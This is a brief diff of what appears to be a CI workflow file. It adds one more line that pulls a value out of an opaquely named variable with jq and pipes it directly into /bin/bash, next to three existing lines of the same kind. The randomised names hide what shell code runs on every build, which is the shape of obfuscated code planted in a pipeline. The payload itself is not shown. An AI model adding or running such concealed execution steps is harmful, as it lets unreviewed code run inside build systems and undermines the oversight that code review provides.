@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$gtmw80" | jq -r .soop272 | /bin/bash
           echo $nusnq5658 | jq -r .sqps2 | /bin/bash
           echo $c718 | jq -r .dzcas5090 | /bin/bash
+          echo $t0 | jq -r .n486 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
